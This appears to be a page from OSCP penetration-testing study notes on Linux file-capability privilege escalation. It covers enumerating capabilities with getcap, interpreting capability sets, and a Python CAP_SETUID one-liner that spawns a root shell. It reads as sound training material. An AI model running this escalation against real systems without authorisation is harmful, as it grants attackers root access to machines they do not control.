# Linux - File Capabilities

**Step 13B of 50 · Linux**

*Find file capabilities, distinguish useful privileges from harmless ones, and validate a capability-backed privilege boundary with the exact binary path.*

Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Use this page after [[Linux - Local Enum]] when getcap returns a non-standard interpreter or utility.

## Why capabilities matter

Linux capabilities split selected root powers away from the all-or-nothing SUID bit. CAP_SETUID is especially important: a capable interpreter may be able to change its process UID to 0 and execute a shell without a SUID bit or a useful sudo -l entry.

## Find and confirm the capability

~~~bash
getcap -r / 2>/dev/null

boxset Candidate /usr/bin/python3.8
getcap "$Candidate"
ls -l "$Candidate"
file "$Candidate"
~~~

The exact path matters. A capability may be attached to a versioned interpreter rather than the python3 symlink, and a capability on one copy does not automatically apply to another.

The suffix describes the capability sets. +eip means effective, inheritable, and permitted; +ep means effective and permitted. CAP_SETUID in the effective/permitted sets is the high-value finding for this route.

## What did you get?

- [ ] A scripting interpreter has CAP_SETUID in an effective/permitted set → **Use the exact path for a controlled setuid proof**
- [ ] A binary has only CAP_NET_BIND_SERVICE, CAP_NET_RAW, or another unrelated capability → **Assess the actual impact; do not assume it gives root**
- [ ] A capability is present but not effective/permitted → **Confirm the process semantics and continue with the other local branches**
- [ ] No useful capability is present → **Return to [[Linux - Sudo Check]], [[Linux - SUID Check]], cron, credential, service, and kernel checks**

## Python cap_setuid proof

For a Python interpreter with CAP_SETUID, use the exact capable path. The command changes the process UID, starts a shell, and immediately verifies the result.

~~~bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
whoami
hostname
~~~

If the output shows uid=0(root), the capability-backed escalation is proven. The group ID may remain the original user's group because CAP_SETUID changes UID, not every process credential; verify the complete id output rather than relying on the prompt.

## Failure handling and cleanup

- If os.setuid(0) raises an error, re-run getcap against the exact interpreter, check whether the capability is effective, and confirm the target architecture and interpreter version.
- If the shell is not interactive, run id and whoami through the same interpreter first; proof of UID change is the key result.
- Do not replace or modify the interpreter. A direct capability proof is enough.
- Remove only files created during transfer or testing, then use [[Linux - Clean Down]].

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- /usr/bin/python3.8 exposed CAP_SETUID, and the exact interpreter path changed to UID 0

## Related stages

- [[Linux - Local Enum]]
- [[Linux - Sudo Check]]
- [[Linux - SUID Check]]
- [[Linux - Clean Down]]

## External Resources

- [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)
- [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)

## Why this matters for OSCP

Capabilities are easy to miss between the familiar sudo and SUID checks. Cap demonstrates that a versioned language interpreter with CAP_SETUID can be the complete local escalation path even when the more obvious checks are unproductive.
